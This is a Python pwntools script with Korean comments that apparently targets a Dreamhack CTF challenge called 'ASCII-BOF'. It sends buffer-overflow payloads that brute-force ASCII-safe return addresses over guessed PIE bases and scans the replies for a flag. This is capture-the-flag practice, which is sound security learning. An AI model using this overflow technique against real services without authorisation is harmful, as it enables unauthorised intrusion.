#!/usr/bin/env python3

"""
ASCII-BOF 정확한 플래그 주소로 최종 시도
"""

from pwn import *
import re

def test_exact_flag_address():
    """정확한 플래그 출력 주소로 테스트"""
    print("[+] 정확한 플래그 출력 주소 테스트")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # objdump에서 찾은 정확한 주소들
    flag_addresses = [
        0x13ba,  # lea 플래그 주소 (메인 타겟)
        0x13c1,  # mov %rax,%rsi
        0x13c4,  # lea 포맷 스트링
        0x13ce,  # printf 호출 직전
        0x13d3,  # printf 호출
    ]
    
    pie_bases = [
        0x555555554000,
        0x555555555000, 
        0x555555556000,
        0x564000000000,
    ]
    
    for pie_base in pie_bases:
        for offset in flag_addresses:
            addr = pie_base + offset
            addr_bytes = p64(addr)[:6]
            
            # ASCII 호환성 체크
            if not all(0x20 < b < 0x7f for b in addr_bytes):
                print(f"PIE 0x{pie_base:x} + 오프셋 0x{offset:x}: ASCII 비호환")
                continue
            
            print(f"\nPIE 베이스: 0x{pie_base:x}")
            print(f"오프셋: 0x{offset:x}")
            print(f"최종 주소: 0x{addr:x}")
            print(f"바이트: {addr_bytes.hex()} ({addr_bytes})")
            
            payload = b"A" * 16 + b"B" * 8 + addr_bytes
            
            try:
                r = remote(HOST, PORT)
                r.recvline()  # Welcome
                r.send(payload + b'\n')
                
                response = r.recvall(timeout=3)
                print(f"응답: {response}")
                
                if b'DH{' in response or b'Flag is' in response:
                    print(f"🎉 성공! PIE: 0x{pie_base:x}, 오프셋: 0x{offset:x}")
                    flag_match = re.search(rb'DH\{[^}]+\}', response)
                    if flag_match:
                        flag = flag_match.group(0).decode()
                        print(f"🏆 플래그: {flag}")
                        return flag
                
                r.close()
                
            except Exception as e:
                print(f"오류: {e}")
    
    return None

def test_function_start():
    """함수 시작점들을 테스트"""
    print("\n[+] 함수 시작점 테스트")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # objdump -d main | grep ">"로 함수 시작점들 찾기
    # 일반적인 함수 시작 오프셋들
    function_starts = [
        0x1000,  # _init
        0x1229,  # main (우리가 아는 것)
        0x1297,  # vuln 함수
        0x1339,  # flag 함수 (기존 추정)
        0x1350,  # 다른 가능한 함수들
        0x1360,
        0x1370,
        0x1380,
        0x1390,
        0x13a0,
        0x13b0,
        0x13c0,  # 플래그 출력 근처
        0x13d0,
        0x13e0,
    ]
    
    pie_base = 0x555555554000
    
    for offset in function_starts:
        addr = pie_base + offset
        addr_bytes = p64(addr)[:6]
        
        # ASCII 호환성 체크
        if not all(0x20 < b < 0x7f for b in addr_bytes):
            continue
        
        print(f"\n함수 시작점 0x{offset:x} (주소: 0x{addr:x})")
        print(f"바이트: {addr_bytes.hex()}")
        
        payload = b"A" * 16 + b"B" * 8 + addr_bytes
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=3)
            print(f"응답: {response}")
            
            if b'DH{' in response or b'Flag is' in response:
                print(f"🎉 성공! 오프셋: 0x{offset:x}")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    return flag_match.group(0).decode()
            
            r.close()
            
        except Exception as e:
            print(f"오류: {e}")
    
    return None

def analyze_current_behavior():
    """현재 동작 분석"""
    print("\n[+] 현재 동작 패턴 분석")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # 다양한 길이로 테스트
    print("1. 길이별 응답 패턴:")
    for length in [16, 24, 30, 31, 32, 33]:
        try:
            r = remote(HOST, PORT)
            r.recvline()
            
            payload = b"A" * length
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=2)
            print(f"   길이 {length:2d}: {response}")
            r.close()
            
        except Exception as e:
            print(f"   길이 {length:2d}: 오류 - {e}")
    
    # ASCII vs Non-ASCII 테스트
    print("\n2. ASCII vs Non-ASCII 테스트:")
    test_payloads = [
        (b"A" * 24 + b"\x41\x42", "ASCII"),
        (b"A" * 24 + b"\x00\x01", "Non-ASCII"),
        (b"A" * 24 + b"\x7f\x80", "경계값"),
    ]
    
    for payload, desc in test_payloads:
        try:
            r = remote(HOST, PORT)  
            r.recvline()
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=2)
            print(f"   {desc}: {response}")
            r.close()
            
        except Exception as e:
            print(f"   {desc}: 오류 - {e}")

def final_comprehensive_test():
    """종합적인 최종 테스트"""
    print("\n[+] 종합 최종 테스트")
    print("=" * 50)
    
    # 앞서 시도해보지 않은 조합들
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # 1. 플래그 함수로 직접 점프하는 대신, main 함수의 특정 지점으로 점프
    main_offsets = [
        0x1229,  # main 시작
        0x1230,  # main 내부
        0x1240,
        0x1250,  
        0x1260,
        0x1270,
        0x1280,
        0x1290,  # vuln 호출 전후
    ]
    
    pie_base = 0x555555554000
    
    for offset in main_offsets:
        addr = pie_base + offset
        addr_bytes = p64(addr)[:6]
        
        if not all(0x20 < b < 0x7f for b in addr_bytes):
            continue
        
        # 특별한 페이로드 구성
        payloads = [
            b"A" * 16 + b"B" * 8 + addr_bytes,  # 기본
            b"flag.txt\x00" + b"A" * 8 + b"B" * 8 + addr_bytes,  # flag.txt 포함
            b"A" * 15 + b"\x00" + b"B" * 8 + addr_bytes,  # NULL 바이트 포함
        ]
        
        for i, payload in enumerate(payloads):
            if len(payload) > 32:
                continue
                
            # ASCII 체크 (NULL 제외)
            non_ascii = False
            for b in payload:
                if b != 0 and not (0x20 < b < 0x7f):
                    non_ascii = True
                    break
            
            if non_ascii:
                continue
            
            print(f"\n오프셋 0x{offset:x}, 페이로드 {i+1}:")
            print(f"페이로드: {payload}")
            
            try:
                r = remote(HOST, PORT)
                r.recvline()
                r.send(payload + b'\n')
                
                response = r.recvall(timeout=3)
                print(f"응답: {response}")
                
                if b'DH{' in response or b'Flag is' in response:
                    print(f"🎉 성공!")
                    flag_match = re.search(rb'DH\{[^}]+\}', response)
                    if flag_match:
                        return flag_match.group(0).decode()
                
                r.close()
                
            except Exception as e:
                print(f"오류: {e}")
    
    return None

if __name__ == "__main__":
    print("🎯 ASCII-BOF 정확한 주소로 최종 시도")
    print("=" * 60)
    
    flag = None
    
    # 1. 정확한 플래그 출력 주소로 시도
    flag = test_exact_flag_address()
    
    if not flag:
        # 2. 함수 시작점들 시도
        flag = test_function_start()
    
    if not flag:
        # 3. 현재 동작 분석
        analyze_current_behavior()
        
        # 4. 종합 테스트
        flag = final_comprehensive_test()
    
    if flag:
        print(f"\n🎉🎉🎉 최종 성공!")
        print(f"🏆 ASCII-BOF 플래그: {flag}")
    else:
        print("\n🤔 추가 분석이 필요합니다.")
        print("힌트: 프로그램 로직을 다시 확인해보세요.")
